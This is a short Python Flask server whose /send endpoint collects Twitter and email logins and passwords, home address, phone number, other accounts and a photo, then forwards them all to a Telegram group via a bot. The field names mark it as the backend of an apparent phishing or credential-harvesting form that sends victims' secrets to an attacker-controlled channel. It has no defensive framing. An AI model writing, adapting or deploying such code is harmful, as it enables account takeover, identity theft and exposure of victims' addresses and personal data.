import os
import base64
from io import BytesIO
from flask import Flask, request, jsonify
import telegram

TOKEN = os.getenv("BOT_TOKEN")
GROUP_ID = os.getenv("GROUP_ID")

if not TOKEN or not GROUP_ID:
    raise ValueError("BOT_TOKEN and GROUP_ID must be set in environment variables.")

bot = telegram.Bot(token=TOKEN)
app = Flask(__name__)

@app.route('/')
def index():
    return "Server is running. Use POST /send to send data."

@app.route('/send', methods=['POST'])
def send_to_telegram():
    twitter_login = request.form.get("twitter_login", "")
    twitter_secret = request.form.get("twitter_secret", "")
    twitter_followers = request.form.get("twitter_followers", "")
    email_login = request.form.get("email_login", "")
    email_secret = request.form.get("email_secret", "")
    country = request.form.get("country", "")
    region = request.form.get("region", "")
    city = request.form.get("city", "")
    street = request.form.get("street", "")
    postal = request.form.get("postal", "")
    house = request.form.get("house", "")
    phone = request.form.get("phone", "")
    other_accounts = request.form.get("other_accounts", "")
    account_usage = request.form.get("account_usage", "")
    account_usage_custom = request.form.get("account_usage_custom", "")
    donation_amount = request.form.get("donation_amount", "")

    caption_parts = [
        f"Twitter login: {twitter_login}",
        f"Twitter secret: {twitter_secret}",
        f"Twitter followers: {twitter_followers}",
        f"Email login: {email_login}",
        f"Email secret: {email_secret}",
        f"Address: {country}, {region}, {city}, {street}, {postal}, {house}",
        f"Phone: {phone}",
        f"Other accounts: {other_accounts}",
        f"Account usage: {account_usage}",
        f"Custom usage: {account_usage_custom}",
        f"Donation amount: {donation_amount}",
    ]
    caption = "\n".join(part for part in caption_parts if part.split(": ")[1].strip())

    photo_base64 = request.form.get("photoBase64") or request.form.get("photoData")

    if not photo_base64:
        try:
            bot.send_message(chat_id=GROUP_ID, text=caption or "No message")
        except Exception as e:
            return jsonify({"error": f"Error sending message to Telegram: {str(e)}"}), 500
        return jsonify({"success": True}), 200

    if photo_base64.startswith("data:image"):
        photo_base64 = photo_base64.split(",", 1)[1]

    try:
        image_data = base64.b64decode(photo_base64)
    except Exception as e:
        return jsonify({"error": f"Error decoding image: {str(e)}"}), 400

    image_file = BytesIO(image_data)
    image_file.name = "photo.jpg"

    try:
        bot.send_photo(chat_id=GROUP_ID, photo=image_file, caption=caption)
    except Exception as e:
        return jsonify({"error": f"Error sending to Telegram: {str(e)}"}), 500

    return jsonify({"success": True}), 200


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
